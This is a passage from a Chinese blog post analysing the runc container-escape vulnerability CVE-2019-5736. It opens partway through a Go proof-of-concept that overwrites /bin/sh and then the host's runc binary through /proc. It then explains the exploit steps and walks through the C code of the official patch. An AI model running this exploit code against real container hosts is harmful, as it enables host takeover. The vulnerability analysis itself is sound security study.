    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Overwritten /bin/sh successfully&#34;</span><span class="p">)</span>

    <span class="c1">// Loop through all processes to find one whose cmdline includes runcinit
</span><span class="c1"></span>    <span class="c1">// This will be the process created by runc
</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">found</span> <span class="kt">int</span>
    <span class="k">for</span> <span class="nx">found</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">{</span>
        <span class="nx">pids</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadDir</span><span class="p">(</span><span class="s">&#34;/proc&#34;</span><span class="p">)</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
            <span class="k">return</span>
        <span class="p">}</span>
        <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">pids</span> <span class="p">{</span>
            <span class="nx">fbytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;/proc/&#34;</span> <span class="o">+</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;/cmdline&#34;</span><span class="p">)</span>
            <span class="nx">fstring</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">fbytes</span><span class="p">)</span>
            <span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">fstring</span><span class="p">,</span> <span class="s">&#34;runc&#34;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Found the PID:&#34;</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
                <span class="nx">found</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
                <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
                    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
                    <span class="k">return</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// We will use the pid to get a file handle for runc on the host.
</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">handleFd</span> <span class="p">=</span> <span class="o">-</span><span class="mi">1</span>
    <span class="k">for</span> <span class="nx">handleFd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">{</span>
        <span class="c1">// Note, you do not need to use the O_PATH flag for the exploit to work.
</span><span class="c1"></span>        <span class="nx">handle</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">OpenFile</span><span class="p">(</span><span class="s">&#34;/proc/&#34;</span><span class="o">+</span><span class="nx">strconv</span><span class="p">.</span><span class="nf">Itoa</span><span class="p">(</span><span class="nx">found</span><span class="p">)</span><span class="o">+</span><span class="s">&#34;/exe&#34;</span><span class="p">,</span> <span class="nx">os</span><span class="p">.</span><span class="nx">O_RDONLY</span><span class="p">,</span> <span class="mo">0777</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="nx">handle</span><span class="p">.</span><span class="nf">Fd</span><span class="p">())</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
            <span class="nx">handleFd</span> <span class="p">=</span> <span class="nb">int</span><span class="p">(</span><span class="nx">handle</span><span class="p">.</span><span class="nf">Fd</span><span class="p">())</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Successfully got the file handle&#34;</span><span class="p">)</span>

    <span class="c1">// Now that we have the file handle, lets write to the runc binary and overwrite it
</span><span class="c1"></span>    <span class="c1">// It will maintain it&#39;s executable flag
</span><span class="c1"></span>    <span class="k">for</span> <span class="p">{</span>
        <span class="nx">writeHandle</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">OpenFile</span><span class="p">(</span><span class="s">&#34;/proc/self/fd/&#34;</span><span class="o">+</span><span class="nx">strconv</span><span class="p">.</span><span class="nf">Itoa</span><span class="p">(</span><span class="nx">handleFd</span><span class="p">),</span> <span class="nx">os</span><span class="p">.</span><span class="nx">O_WRONLY</span><span class="p">|</span><span class="nx">os</span><span class="p">.</span><span class="nx">O_TRUNC</span><span class="p">,</span> <span class="mo">0700</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="nx">writeHandle</span><span class="p">.</span><span class="nf">Fd</span><span class="p">())</span> <span class="p">&gt;</span> <span class="mi">0</span> <span class="p">{</span>
            <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Successfully got write handle&#34;</span><span class="p">,</span> <span class="nx">writeHandle</span><span class="p">)</span>
            <span class="nx">writeHandle</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">payload</span><span class="p">))</span>
            <span class="k">return</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC#step-by-step-explanation" target="_blank" rel="noopener noreffer">Poc原理介绍</a></p>
<ul>
<li>改写容器中的<code>/bin/sh</code>文件，写入<code>#!/proc/self/exe</code></li>
<li><code>#!/proc/self/exe</code>使得runc执行<code>/bin/sh</code>时会执行自身</li>
<li>在容器中找到runc进程的进程号id，也就是上述runc调用链中的runc init进程，并尝试去获取<code>/proc/id/exe</code>（即宿主机上的runc文件）。而runc init正在执行时，系统是不允许往runc写文件的，因此以读的方式打开</li>
<li>当runc init结束之后，再从<code>/proc/self/fd</code>中以写方式打开runc的文件描述符，写入恶意代码</li>
</ul>
<p><a href="https://sites.google.com/site/readliner/study/linux/proc-fs-1" target="_blank" rel="noopener noreffer">/proc虚拟文件系统介绍</a></p>
<p><figure><a class="lightgallery" href="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_bdd41b5b3d35080460631eed73f6de7b.png" title="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_bdd41b5b3d35080460631eed73f6de7b.png" data-thumbnail="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_bdd41b5b3d35080460631eed73f6de7b.png" data-sub-html="<h2>upload_bdd41b5b3d35080460631eed73f6de7b.png</h2>">
        <img
            class="lazyload"
            data-src="upload_bdd41b5b3d35080460631eed73f6de7b.png"
            data-srcset="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_bdd41b5b3d35080460631eed73f6de7b.png, upload_bdd41b5b3d35080460631eed73f6de7b.png 1.5x, /2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_bdd41b5b3d35080460631eed73f6de7b.png 2x"
            data-sizes="auto"
            alt="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_bdd41b5b3d35080460631eed73f6de7b.png"
        />
    </a><figcaption class="image-caption">upload_bdd41b5b3d35080460631eed73f6de7b.png</figcaption>
    </figure></p>
<h2 id="0x04-修复代码分析">0x04 修复代码分析</h2>
<p><figure><a class="lightgallery" href="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_0878eab4eacead51c5850593e66effdd.png" title="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_0878eab4eacead51c5850593e66effdd.png" data-thumbnail="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_0878eab4eacead51c5850593e66effdd.png" data-sub-html="<h2>upload_0878eab4eacead51c5850593e66effdd.png</h2>">
        <img
            class="lazyload"
            data-src="upload_0878eab4eacead51c5850593e66effdd.png"
            data-srcset="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_0878eab4eacead51c5850593e66effdd.png, upload_0878eab4eacead51c5850593e66effdd.png 1.5x, /2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_0878eab4eacead51c5850593e66effdd.png 2x"
            data-sizes="auto"
            alt="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/upload_0878eab4eacead51c5850593e66effdd.png"
        />
    </a><figcaption class="image-caption">upload_0878eab4eacead51c5850593e66effdd.png</figcaption>
    </figure></p>
<p>引入的<code>ensure_cloned_binary()</code>函数会创建克隆的runc文件并执行<code>fexecve()</code>函数替换当前进程映像</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">//libcontainer/nsenter/cloned_binary.c
</span><span class="c1"></span><span class="kt">int</span> <span class="nf">ensure_cloned_binary</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">execfd</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="cm">/* Check that we&#39;re not self-cloned, and if we are then bail. */</span>
    <span class="kt">int</span> <span class="n">cloned</span> <span class="o">=</span> <span class="n">is_self_cloned</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">cloned</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">cloned</span> <span class="o">==</span> <span class="o">-</span><span class="n">ENOTRECOVERABLE</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">cloned</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">fetchve</span><span class="p">(</span><span class="o">&amp;</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
    
    <span class="c1">//创建克隆文件
</span><span class="c1"></span>    <span class="n">execfd</span> <span class="o">=</span> <span class="n">clone_binary</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">execfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">EIO</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">putenv</span><span class="p">(</span><span class="n">CLONED_BINARY_ENV</span> <span class="s">&#34;=1&#34;</span><span class="p">))</span>
        <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>

    <span class="n">fexecve</span><span class="p">(</span><span class="n">execfd</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">environ</span><span class="p">);</span>
    <span class="nl">error</span><span class="p">:</span>
    <span class="n">close</span><span class="p">(</span><span class="n">execfd</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">ENOEXEC</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>我们还可以在被调用的<code>clone_binary()</code>函数中看到克隆的逻辑：</p>
<ul>
<li>创建新的文件</li>
<li>以读方式打开<code>/proc/self/exe</code>，也就是宿主机上的runc文件</li>
<li><code>sendfile()</code> I/O函数将runc文件内容写入到新的文件中</li>
<li>返回新的文件描述符</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">int</span> <span class="nf">clone_binary</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">binfd</span><span class="p">,</span> <span class="n">execfd</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">stat</span> <span class="n">statbuf</span> <span class="o">=</span> <span class="p">{</span> <span class="p">};</span>
    <span class="n">size_t</span> <span class="n">sent</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">fdtype</span> <span class="o">=</span> <span class="n">EFD_NONE</span><span class="p">;</span>

    <span class="cm">/*
</span><span class="cm">     * Before we resort to copying, let&#39;s try creating an ro-binfd in one shot
</span><span class="cm">     * by getting a handle for a read-only bind-mount of the execfd.
</span><span class="cm">     */</span>
    <span class="n">execfd</span> <span class="o">=</span> <span class="n">try_bindfd</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">execfd</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">execfd</span><span class="p">;</span>

    <span class="cm">/*
</span><span class="cm">     * Dammit, that didn&#39;t work -- time to copy the binary to a safe place we
</span><span class="cm">     * can seal the contents.
</span><span class="cm">     */</span>
    <span class="c1">// 创建空的克隆文件，待写入
</span><span class="c1"></span>    <span class="n">execfd</span> <span class="o">=</span> <span class="n">make_execfd</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fdtype</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">execfd</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">fdtype</span> <span class="o">==</span> <span class="n">EFD_NONE</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">ENOTRECOVERABLE</span><span class="p">;</span>
    
    <span class="c1">// 这里的应该是原本的runc
</span><span class="c1"></span>    <span class="n">binfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/proc/self/exe&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span> <span class="o">|</span> <span class="n">O_CLOEXEC</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">binfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">fstat</span><span class="p">(</span><span class="n">binfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">statbuf</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">error_binfd</span><span class="p">;</span>

    <span class="c1">//写入内容
</span><span class="c1"></span>    <span class="k">while</span> <span class="p">(</span><span class="n">sent</span> <span class="o">&lt;</span> <span class="n">statbuf</span><span class="p">.</span><span class="n">st_size</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">sendfile</span><span class="p">(</span><span class="n">execfd</span><span class="p">,</span> <span class="n">binfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">statbuf</span><span class="p">.</span><span class="n">st_size</span> <span class="o">-</span> <span class="n">sent</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* sendfile can fail so we fallback to a dumb user-space copy. */</span>
            <span class="n">n</span> <span class="o">=</span> <span class="n">fd_to_fd</span><span class="p">(</span><span class="n">execfd</span><span class="p">,</span> <span class="n">binfd</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
                <span class="k">goto</span> <span class="n">error_binfd</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">sent</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">close</span><span class="p">(</span><span class="n">binfd</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sent</span> <span class="o">!=</span> <span class="n">statbuf</span><span class="p">.</span><span class="n">st_size</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">seal_execfd</span><span class="p">(</span><span class="o">&amp;</span><span class="n">execfd</span><span class="p">,</span> <span class="n">fdtype</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">error</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">execfd</span><span class="p">;</span>

    <span class="nl">error_binfd</span><span class="p">:</span>
    <span class="n">close</span><span class="p">(</span><span class="n">binfd</span><span class="p">);</span>
    <span class="nl">error</span><span class="p">:</span>
    <span class="n">close</span><span class="p">(</span><span class="n">execfd</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EIO</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="参考链接">参考链接</h2>
<ul>
<li><a href="https://fankangbest.github.io/2017/11/22/runc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%28%E4%B8%80%29-create%E5%92%8Cstart%E6%B5%81%E7%A8%8B-v1-0-0-rc2/" target="_blank" rel="noopener noreffer">runc源码分析(一)-create和start流程-v1.0.0-rc2</a></li>
<li><a href="https://imkira.com/runc/" target="_blank" rel="noopener noreffer">runc 启动容器过程分析（附 CVE-2019-5736 实现过程）</a></li>
<li><a href="https://notes.sjtu.edu.cn/s/8USeKk5DR#docker-runc-CVE-2019-5736" target="_blank" rel="noopener noreffer">CVE-2019-5736复现及分析</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/0a8e4117e7f715d5fbeef398405813ce8e88558b" target="_blank" rel="noopener noreffer">CVE-2019-5736 patch</a></li>
</ul>
</div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2021-04-20</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/index.md" target="_blank" rel="noopener noreferrer">阅读原始文档</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="#" onclick="return false;" title="分享到 Twitter" data-sharer="twitter" data-url="https://liuliuliuzy.github.io/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/" data-title="docker-runc(CVE-2019-5736)漏洞分析" data-hashtags="Docker,Linux,Golang"><i class="fab fa-twitter fa-fw"></i></a><a href="#" onclick="return false;" title="分享到 Reddit" data-sharer="reddit" data-url="https://liuliuliuzy.github.io/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/"><i class="fab fa-reddit fa-fw"></i></a><a href="#" onclick="return false;" title="分享到 微博" data-sharer="weibo" data-url="https://liuliuliuzy.github.io/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/" data-title="docker-runc(CVE-2019-5736)漏洞分析"><i class="fab fa-weibo fa-fw"></i></a><a href="#" onclick="return false;" title="分享到 百度" data-sharer="baidu" data-url="https://liuliuliuzy.github.io/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/" data-title="docker-runc(CVE-2019-5736)漏洞分析"><i data-svg-src="/lib/simple-icons/icons/baidu.min.svg"></i></a><a href="#" onclick="return false;" title="分享到 Evernote" data-sharer="evernote" data-url="https://liuliuliuzy.github.io/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/" data-title="docker-runc(CVE-2019-5736)漏洞分析"><i class="fab fa-evernote fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/docker/">Docker</a>,&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/golang/">Golang</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2021-04-05-golang-notes/" class="prev" rel="prev" title="Golang notes"><i class="fas fa-angle-left fa-fw"></i>Golang notes</a>
            <a href="/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/" class="next" rel="next" title="docker-runc(CVE-2019-5736)漏洞分析-第二版">docker-runc(CVE-2019-5736)漏洞分析-第二版<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="valine" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
            </noscript></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div></footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-Z392YPQYYV', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-Z392YPQYYV" async></script></div>

